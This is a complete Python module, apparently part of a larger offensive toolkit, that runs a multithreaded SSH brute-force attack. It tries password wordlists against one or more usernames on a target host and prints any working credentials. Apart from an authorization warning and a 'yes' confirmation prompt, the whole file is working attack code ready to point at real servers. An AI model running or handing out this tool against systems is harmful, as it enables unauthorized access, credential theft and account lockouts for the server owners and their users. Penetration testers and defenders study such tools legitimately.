# modules/sshbrute.py

import argparse
import os
import sys
import threading
import time
import queue
import paramiko


# A flag to signal all threads to stop once a password is found.
stop_flag = threading.Event()
# A lock for thread-safe printing to the console.
print_lock = threading.Lock()

def ssh_connect_and_brute(hostname, port, user_queue, password_list):
    """
    Worker function for threads. It pulls a username from a queue and then
    tries all passwords from the password list against that user.
    """
    while not stop_flag.is_set() and not user_queue.empty():
        try:
            # Get a username from the queue without blocking.
            username = user_queue.get(block=False)
        except queue.Empty:
            break # Exit thread if the queue is empty.

        with print_lock:
            print(f"\n[*] Testing username: '{username}'...")

        for password in password_list:
            # If another thread has found the password, stop immediately.
            if stop_flag.is_set():
                user_queue.task_done()
                return

            client = paramiko.SSHClient()
            # This policy automatically adds the server's host key.
            # It's necessary for automation but be aware of the security implications.
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                # Attempt to connect with a short timeout.
                client.connect(hostname=hostname, port=port, username=username, password=password, timeout=5, banner_timeout=10)
                
                # If the connection succeeds, we have found the credentials.
                with print_lock:
                    print("\n" + "="*50)
                    print(f"[+] SUCCESS! Credentials Found:")
                    print(f"[+] Host: {hostname}:{port}")
                    print(f"[+] Username: {username}")
                    print(f"[+] Password: {password}")
                    print("="*50)
                
                stop_flag.set() # Signal all other threads to stop their work.
                client.close()
                user_queue.task_done()
                return # End this thread's execution.

            except paramiko.AuthenticationException:
                # This is the most common and expected exception: login failed.
                with print_lock:
                    # Overwrite the same line for clean "failed attempt" output.
                    sys.stdout.write(f"\r[-] Failed: {username}:{password}{' ' * 20}")
                    sys.stdout.flush()
                pass # Continue to the next password.
            except paramiko.SSHException as e:
                # Handle SSH-level errors, like banner timeouts.
                with print_lock:
                    print(f"\n[!] SSH protocol error for '{username}': {e}. Skipping user.")
                break # Stop trying passwords for this user.
            except Exception as e:
                # Handle network-level errors (e.g., connection refused).
                with print_lock:
                    print(f"\n[!] Connection error for '{username}': {e}. Skipping user.")
                break # Stop trying passwords for this user.
            finally:
                client.close()
        
        # Mark the username as processed.
        user_queue.task_done()

def main():
    """Main function to parse arguments and orchestrate the brute-force attack."""
    parser = argparse.ArgumentParser(
        description="SSH Brute-Force Module. Provide a single user (-u) or a user list (-U).",
        formatter_class=argparse.RawTextHelpFormatter
    )
    # --- Argument setup ---
    parser.add_argument("target_host", help="The IP address or hostname of the SSH server.")
    # A mutually exclusive group ensures the user provides a user OR a userlist, but not both.
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--user", help="A single username to test.")
    group.add_argument("-U", "--userlist", help="Path to a username list file.")
    parser.add_argument("-w", "--wordlist", help="Path to a password wordlist file.", required=True)
    parser.add_argument("-p", "--port", type=int, default=22, help="The SSH port (default: 22).")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of concurrent threads (default: 5).")

    if len(sys.argv) < 4: # A basic check for the minimum required arguments.
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()

    # --- File existence checks ---
    if not os.path.exists(args.wordlist):
        print(f"[!] Error: Wordlist not found at '{args.wordlist}'")
        sys.exit(1)
    if args.userlist and not os.path.exists(args.userlist):
        print(f"[!] Error: User list not found at '{args.userlist}'")
        sys.exit(1)

    # --- Ethical Warning Block ---
    print("\n" + "="*60)
    print("  [!] WARNING: You are about to perform an SSH brute-force attack.")
    print(f"  Target: {args.target_host}:{args.port}")
    if args.user:
        print(f"  Username: {args.user}")
    else:
        print(f"  User List: {args.userlist}")
    print(f"  Wordlist: {args.wordlist}")
    print(f"  Threads: {args.threads}")
    print("\n  This can lock out accounts or be detected by security systems.")
    print("  This is illegal without explicit authorization.")
    print("="*60)

    confirm = input("Are you sure you want to proceed? (Type 'yes' to confirm): ")
    if confirm.lower().strip() != 'yes':
        print("[*] Attack aborted by user.")
        sys.exit(0)

    print(f"\n[*] Starting SSH brute-force attack on {args.target_host}...")
    
    # --- Populate the user queue and load the password list ---
    user_queue = queue.Queue()
    if args.user:
        user_queue.put(args.user)
    else:
        with open(args.userlist, 'r', errors='ignore') as f:
            for line in f:
                if line.strip(): # Avoid adding empty lines
                    user_queue.put(line.strip())
    
    with open(args.wordlist, 'r', errors='ignore') as f:
        password_list = [line.strip() for line in f if line.strip()]

    if user_queue.empty() or not password_list:
        print("[!] User source or password list is empty. Aborting.")
        sys.exit(1)

    print(f"[*] Loaded {user_queue.qsize()} username(s) and {len(password_list)} passwords.")
    start_time = time.time()

    # --- Threading Initialization and Execution ---
    threads = []
    for _ in range(args.threads):
        thread = threading.Thread(target=ssh_connect_and_brute, args=(args.target_host, args.port, user_queue, password_list))
        thread.daemon = True # Allows the main program to exit even if threads are running.
        thread.start()
        threads.append(thread)

    try:
        # Wait until the user queue is empty, meaning all users have been processed.
        user_queue.join()
        # Signal threads to stop in case the queue finished but threads are lingering.
        stop_flag.set() 
        for t in threads:
            t.join() # Cleanly wait for all threads to terminate.
    except KeyboardInterrupt:
        print("\n[*] User interrupted the attack. Shutting down threads...")
        stop_flag.set()
        for t in threads:
            t.join()

    duration = time.time() - start_time
    print(f"\n[*] Attack finished in {duration:.2f} seconds.")

if __name__ == "__main__":
    main()